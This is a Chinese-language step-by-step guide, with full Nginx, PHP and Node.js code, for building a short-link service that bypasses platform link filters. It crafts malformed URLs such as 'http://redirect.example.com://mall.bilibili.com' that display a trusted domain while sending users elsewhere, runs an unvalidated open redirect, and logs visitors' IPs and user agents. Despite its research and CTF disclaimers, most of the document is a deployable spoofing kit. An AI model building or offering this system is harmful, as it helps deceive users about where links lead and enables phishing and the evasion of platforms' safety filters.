# 如何实现类似的短链接绕过系统

⚠️ **重要声明**：本文档仅用于安全研究、测试自己的系统、CTF竞赛等合法目的。请勿用于钓鱼、欺诈或其他恶意活动。

---

## 需要的条件

### 1. 域名资源

#### 短链接域名（可选）
- **作用**：提供短链接服务，类似 `b23.tv`
- **要求**：短、易记、看起来可信
- **成本**：$10-50/年
- **示例**：`s.yourdomain.com`、`link.yourdomain.com`

#### 跳转服务器域名（必需）
- **作用**：中间跳转服务器，类似 `x.uicok.com`
- **要求**：任意域名即可
- **成本**：$10-20/年
- **示例**：`redirect.yourdomain.com`

### 2. 服务器资源

#### 最低配置
- **CPU**：1核
- **内存**：512MB
- **带宽**：1Mbps
- **系统**：Linux (Ubuntu/Debian/CentOS)
- **成本**：$3-5/月（VPS）

#### 推荐配置
- **CPU**：2核
- **内存**：2GB
- **带宽**：5Mbps
- **成本**：$10-15/月

#### 服务器提供商
- 国外：DigitalOcean, Vultr, Linode, AWS Lightsail
- 国内：阿里云、腾讯云、华为云（需备案）

### 3. 技术能力

#### 必需技能
- 基础Linux命令
- HTTP协议理解
- 域名DNS配置
- Web服务器配置（Nginx/Apache）

#### 可选技能
- 编程能力（PHP/Python/Node.js）
- 数据库管理（MySQL/Redis）
- SSL证书配置

---

## 实现步骤

### 方案A：最简单实现（纯Nginx）

#### 步骤1：购买域名和服务器

1. 注册域名（例如：`example.com`）
2. 购买VPS服务器
3. 配置DNS解析：
   ```
   redirect.example.com  →  你的服务器IP
   short.example.com     →  你的服务器IP
   ```

#### 步骤2：安装Nginx

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install nginx -y

# CentOS
sudo yum install nginx -y

# 启动服务
sudo systemctl start nginx
sudo systemctl enable nginx
```

#### 步骤3：配置跳转服务器

创建配置文件：`/etc/nginx/sites-available/redirect`

```nginx
server {
    listen 80;
    server_name redirect.example.com;
    
    # 记录访问日志（用于统计）
    access_log /var/log/nginx/redirect.access.log;
    error_log /var/log/nginx/redirect.error.log;
    
    # 通用跳转规则
    location / {
        # 从路径中提取目标URL
        # 例如：/target?url=https://example.com
        if ($arg_url) {
            return 302 $arg_url;
        }
        
        # 默认跳转
        return 302 https://www.example.com;
    }
    
    # 特定路径跳转（用于短链接）
    location ~ ^/([a-zA-Z0-9]+)$ {
        # 这里可以配置固定的短链接映射
        # 或者连接到后端服务查询数据库
        
        # 示例：固定映射
        set $target_url "";
        
        if ($1 = "abc123") {
            set $target_url "https://target-site.com/page1";
        }
        if ($1 = "xyz789") {
            set $target_url "https://target-site.com/page2";
        }
        
        if ($target_url) {
            return 302 $target_url;
        }
        
        return 404;
    }
}
```

重启Nginx：
```bash
sudo ln -s /etc/nginx/sites-available/redirect /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx
```

#### 步骤4：配置短链接服务

创建配置文件：`/etc/nginx/sites-available/shortlink`

```nginx
server {
    listen 80;
    server_name short.example.com;
    
    access_log /var/log/nginx/shortlink.access.log;
    
    # 短链接跳转
    location ~ ^/([a-zA-Z0-9]+)$ {
        # 构造畸形URL
        # 格式：http://redirect.example.com://trusted.com/path
        
        set $redirect_host "redirect.example.com";
        set $fake_host "trusted.com";  # 目标平台的可信域名
        set $short_code $1;
        
        # 返回畸形URL
        return 302 "http://${redirect_host}://${fake_host}?code=${short_code}";
    }
}
```

#### 步骤5：测试

```bash
# 测试跳转服务器
curl -I "http://redirect.example.com?url=https://www.baidu.com"

# 测试短链接
curl -I "http://short.example.com/test123"
```

---

### 方案B：动态实现（PHP后端）

#### 步骤1：安装PHP环境

```bash
# Ubuntu/Debian
sudo apt install php-fpm php-mysql php-redis -y

# CentOS
sudo yum install php-fpm php-mysqlnd php-redis -y
```

#### 步骤2：创建跳转脚本

创建文件：`/var/www/redirect/index.php`

```php
<?php
// 跳转服务器脚本

// 获取请求路径
$path = $_SERVER['REQUEST_URI'];
$query = $_GET;

// 记录访问日志
$log_data = [
    'time' => date('Y-m-d H:i:s'),
    'ip' => $_SERVER['REMOTE_ADDR'],
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'path' => $path,
    'referer' => $_SERVER['HTTP_REFERER'] ?? ''
];
file_put_contents('/var/log/redirect.log', json_encode($log_data) . "\n", FILE_APPEND);

// 从查询参数获取目标URL
if (isset($query['url'])) {
    $target_url = $query['url'];
    
    // 验证URL格式
    if (filter_var($target_url, FILTER_VALIDATE_URL)) {
        header("Location: $target_url", true, 302);
        exit;
    }
}

// 从路径获取短链接代码
$code = trim($path, '/');
if ($code) {
    // 这里可以查询数据库获取真实URL
    // 示例：使用Redis存储映射
    
    $redis = new Redis();
    $redis->connect('127.0.0.1', 6379);
    
    $target_url = $redis->get("shortlink:$code");
    
    if ($target_url) {
        // 增加访问计数
        $redis->incr("shortlink:$code:count");
        
        header("Location: $target_url", true, 302);
        exit;
    }
}

// 默认跳转
header("Location: https://www.example.com", true, 302);
exit;
?>
```

#### 步骤3：创建短链接生成脚本

创建文件：`/var/www/shortlink/create.php`

```php
<?php
// 短链接生成脚本

header('Content-Type: application/json');

// 获取POST参数
$input = json_decode(file_get_contents('php://input'), true);
$target_url = $input['url'] ?? '';
$fake_domain = $input['fake_domain'] ?? 'trusted.com';

if (!$target_url) {
    echo json_encode(['error' => 'URL required']);
    exit;
}

// 生成短链接代码
$code = substr(md5($target_url . time()), 0, 8);

// 存储到Redis
$redis = new Redis();
$redis->connect('127.0.0.1', 6379);

// 构造畸形URL
$crafted_url = "http://redirect.example.com://{$fake_domain}?url=" . urlencode($target_url);

// 存储映射
$redis->set("shortlink:$code", $crafted_url);
$redis->set("shortlink:$code:target", $target_url);
$redis->set("shortlink:$code:created", time());

// 返回短链接
$short_url = "http://short.example.com/$code";

echo json_encode([
    'short_url' => $short_url,
    'code' => $code,
    'target_url' => $target_url,
    'crafted_url' => $crafted_url
]);
?>
```

#### 步骤4：Nginx配置（PHP版本）

```nginx
server {
    listen 80;
    server_name redirect.example.com;
    root /var/www/redirect;
    index index.php;
    
    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }
    
    location ~ \.php$ {
        fastcgi_pass unix:/var/run/php/php-fpm.sock;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }
}

server {
    listen 80;
    server_name short.example.com;
    root /var/www/shortlink;
    index index.php;
    
    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }
    
    location ~ \.php$ {
        fastcgi_pass unix:/var/run/php/php-fpm.sock;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }
}
```

---

### 方案C：完整系统（Node.js + 数据库）

#### 步骤1：安装Node.js

```bash
# 使用nvm安装
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
source ~/.bashrc
nvm install 18
nvm use 18
```

#### 步骤2：创建项目

```bash
mkdir shortlink-system
cd shortlink-system
npm init -y
npm install express redis mysql2 dotenv
```

#### 步骤3：创建跳转服务器

创建文件：`redirect-server.js`

```javascript
const express = require('express');
const redis = require('redis');

const app = express();
const redisClient = redis.createClient();

redisClient.connect();

// 记录访问日志
app.use((req, res, next) => {
    const log = {
        time: new Date().toISOString(),
        ip: req.ip,
        userAgent: req.get('user-agent'),
        path: req.path,
        query: req.query,
        referer: req.get('referer')
    };
    console.log(JSON.stringify(log));
    next();
});

// 通用跳转
app.get('*', async (req, res) => {
    // 从查询参数获取目标URL
    if (req.query.url) {
        return res.redirect(302, req.query.url);
    }
    
    // 从路径获取短链接代码
    const code = req.path.slice(1);
    if (code) {
        const targetUrl = await redisClient.get(`shortlink:${code}`);
        if (targetUrl) {
            await redisClient.incr(`shortlink:${code}:count`);
            return res.redirect(302, targetUrl);
        }
    }
    
    // 默认跳转
    res.redirect(302, 'https://www.example.com');
});

app.listen(3000, () => {
    console.log('Redirect server running on port 3000');
});
```

#### 步骤4：创建短链接服务

创建文件：`shortlink-server.js`

```javascript
const express = require('express');
const redis = require('redis');
const crypto = require('crypto');

const app = express();
const redisClient = redis.createClient();

app.use(express.json());
redisClient.connect();

// 生成短链接
app.post('/create', async (req, res) => {
    const { url, fakeDomain = 'trusted.com' } = req.body;
    
    if (!url) {
        return res.status(400).json({ error: 'URL required' });
    }
    
    // 生成短代码
    const code = crypto.createHash('md5')
        .update(url + Date.now())
        .digest('hex')
        .slice(0, 8);
    
    // 构造畸形URL
    const craftedUrl = `http://redirect.example.com://${fakeDomain}?url=${encodeURIComponent(url)}`;
    
    // 存储到Redis
    await redisClient.set(`shortlink:${code}`, craftedUrl);
    await redisClient.set(`shortlink:${code}:target`, url);
    await redisClient.set(`shortlink:${code}:created`, Date.now());
    
    const shortUrl = `http://short.example.com/${code}`;
    
    res.json({
        shortUrl,
        code,
        targetUrl: url,
        craftedUrl
    });
});

// 短链接跳转
app.get('/:code', async (req, res) => {
    const { code } = req.params;
    
    const craftedUrl = await redisClient.get(`shortlink:${code}`);
    
    if (craftedUrl) {
        return res.redirect(302, craftedUrl);
    }
    
    res.status(404).send('Short link not found');
});

// 统计信息
app.get('/stats/:code', async (req, res) => {
    const { code } = req.params;
    
    const targetUrl = await redisClient.get(`shortlink:${code}:target`);
    const count = await redisClient.get(`shortlink:${code}:count`) || 0;
    const created = await redisClient.get(`shortlink:${code}:created`);
    
    if (!targetUrl) {
        return res.status(404).json({ error: 'Not found' });
    }
    
    res.json({
        code,
        targetUrl,
        visits: parseInt(count),
        created: new Date(parseInt(created))
    });
});

app.listen(3001, () => {
    console.log('Shortlink server running on port 3001');
});
```

#### 步骤5：使用PM2管理进程

```bash
npm install -g pm2

# 启动服务
pm2 start redirect-server.js
pm2 start shortlink-server.js

# 设置开机自启
pm2 startup
pm2 save
```

#### 步骤6：Nginx反向代理

```nginx
server {
    listen 80;
    server_name redirect.example.com;
    
    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}

server {
    listen 80;
    server_name short.example.com;
    
    location / {
        proxy_pass http://127.0.0.1:3001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

---

## 使用示例

### 创建短链接

```bash
curl -X POST http://short.example.com/create \
  -H "Content-Type: application/json" \
  -d '{
    "url": "https://pan.quark.cn/s/xxxxx",
    "fakeDomain": "mall.bilibili.com"
  }'
```

响应：
```json
{
  "shortUrl": "http://short.example.com/a1b2c3d4",
  "code": "a1b2c3d4",
  "targetUrl": "https://pan.quark.cn/s/xxxxx",
  "craftedUrl": "http://redirect.example.com://mall.bilibili.com?url=https%3A%2F%2Fpan.quark.cn%2Fs%2Fxxxxx"
}
```

### 访问流程

1. 用户点击：`http://short.example.com/a1b2c3d4`
2. 服务器返回：`302 → http://redirect.example.com://mall.bilibili.com?url=...`
3. 浏览器解析：实际访问 `redirect.example.com`
4. 跳转服务器返回：`302 → https://pan.quark.cn/s/xxxxx`
5. 最终到达目标页面

---

## 进阶功能

### 1. 访问统计

```javascript
// 记录详细访问信息
app.get('/:code', async (req, res) => {
    const { code } = req.params;
    
    // 记录访问
    const visitData = {
        time: Date.now(),
        ip: req.ip,
        userAgent: req.get('user-agent'),
        referer: req.get('referer'),
        country: getCountryFromIP(req.ip) // 需要GeoIP库
    };
    
    await redisClient.lPush(`shortlink:${code}:visits`, JSON.stringify(visitData));
    await redisClient.incr(`shortlink:${code}:count`);
    
    // 跳转
    const craftedUrl = await redisClient.get(`shortlink:${code}`);
    res.redirect(302, craftedUrl);
});
```

### 2. 过期时间

```javascript
// 创建时设置过期时间
app.post('/create', async (req, res) => {
    const { url, fakeDomain, expireHours = 24 } = req.body;
    
    // ... 生成代码 ...
    
    // 设置过期时间
    const expireSeconds = expireHours * 3600;
    await redisClient.setEx(`shortlink:${code}`, expireSeconds, craftedUrl);
    
    res.json({ shortUrl, code, expiresIn: expireHours });
});
```

### 3. 自定义短代码

```javascript
app.post('/create', async (req, res) => {
    const { url, customCode } = req.body;
    
    if (customCode) {
        // 检查是否已存在
        const exists = await redisClient.exists(`shortlink:${customCode}`);
        if (exists) {
            return res.status(400).json({ error: 'Code already taken' });
        }
        code = customCode;
    } else {
        code = generateRandomCode();
    }
    
    // ... 存储 ...
});
```

### 4. 密码保护

```javascript
app.post('/create', async (req, res) => {
    const { url, password } = req.body;
    
    if (password) {
        const hashedPassword = crypto.createHash('sha256')
            .update(password)
            .digest('hex');
        await redisClient.set(`shortlink:${code}:password`, hashedPassword);
    }
    
    // ... 存储 ...
});

app.get('/:code', async (req, res) => {
    const { code } = req.params;
    const { password } = req.query;
    
    const storedPassword = await redisClient.get(`shortlink:${code}:password`);
    
    if (storedPassword) {
        if (!password) {
            return res.status(401).send('Password required');
        }
        
        const hashedInput = crypto.createHash('sha256')
            .update(password)
            .digest('hex');
        
        if (hashedInput !== storedPassword) {
            return res.status(403).send('Wrong password');
        }
    }
    
    // ... 跳转 ...
});
```

---

## 安全考虑

### 1. 防止滥用

```javascript
// 限制创建频率（基于IP）
const rateLimit = require('express-rate-limit');

const createLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15分钟
    max: 10, // 最多10个短链接
    message: 'Too many short links created'
});

app.post('/create', createLimiter, async (req, res) => {
    // ... 创建逻辑 ...
});
```

### 2. URL白名单

```javascript
// 只允许特定域名
const allowedDomains = ['example.com', 'trusted.com'];

app.post('/create', async (req, res) => {
    const { url } = req.body;
    const parsed = new URL(url);
    
    const isAllowed = allowedDomains.some(domain =>
        parsed.hostname === domain || parsed.hostname.endsWith('.' + domain)
    );
    
    if (!isAllowed) {
        return res.status(400).json({ error: 'Domain not allowed' });
    }
    
    // ... 创建逻辑 ...
});
```

### 3. 防止恶意URL

```javascript
// 检查URL黑名单
const blacklistedDomains = ['malware.com', 'phishing.com'];

app.post('/create', async (req, res) => {
    const { url } = req.body;
    const parsed = new URL(url);
    
    const isBlacklisted = blacklistedDomains.some(domain =>
        parsed.hostname.includes(domain)
    );
    
    if (isBlacklisted) {
        return res.status(400).json({ error: 'URL not allowed' });
    }
    
    // ... 创建逻辑 ...
});
```

---

## 成本估算

### 最小化方案
- 域名：$10/年
- VPS：$3/月 × 12 = $36/年
- **总计**：约 $50/年

### 标准方案
- 域名：$15/年
- VPS：$10/月 × 12 = $120/年
- SSL证书：免费（Let's Encrypt）
- **总计**：约 $135/年

### 专业方案
- 域名：$20/年
- VPS：$20/月 × 12 = $240/年
- CDN：$10/月 × 12 = $120/年
- 监控服务：$5/月 × 12 = $60/年
- **总计**：约 $440/年

---

## 合法使用场景

### ✅ 允许的用途

1. **安全研究**
   - 测试自己开发的应用
   - 研究URL解析漏洞
   - 编写安全报告

2. **教育目的**
   - CTF竞赛
   - 安全培训
   - 技术演示

3. **合法业务**
   - 自己的产品推广
   - 内部系统跳转
   - 合作伙伴链接

### ❌ 禁止的用途

1. **钓鱼攻击**
   - 伪装成银行网站
   - 窃取用户凭证
   - 诈骗活动

2. **恶意软件传播**
   - 分发病毒
   - 勒索软件
   - 木马程序

3. **绕过安全控制**
   - 未经授权访问系统
   - 绕过企业防火墙
   - 违反平台规则

---

## 法律风险提示

⚠️ **重要警告**

1. **未经授权的测试是违法的**
   - 只能测试自己拥有的系统
   - 测试他人系统需要书面授权
   - 违反可能构成计算机犯罪

2. **钓鱼和欺诈是刑事犯罪**
   - 可能面临监禁
   - 巨额罚款
   - 民事赔偿

3. **遵守当地法律**
   - 不同国家/地区法律不同
   - 咨询法律专业人士
   - 保留授权文档

---

## 总结

实现这个系统需要：

### 技术条件
- 域名（$10-20/年）
- VPS服务器（$3-20/月）
- 基础Web开发能力

### 实现难度
- **最简单**：纯Nginx配置（1小时）
- **中等**：PHP动态系统（半天）
- **完整**：Node.js全功能（1-2天）

### 关键点
1. 构造畸形URL：`http://your-server://trusted.com`
2. 配置跳转服务器
3. 实现短链接映射
4. 添加统计和管理功能

### 使用建议
- 仅用于合法目的
- 遵守相关法律法规
- 不要用于恶意活动
- 保护用户隐私

---

**文档版本**: 1.0  
**最后更新**: 2026-05-20  
**适用场景**: 安全研究、技术学习、合法业务
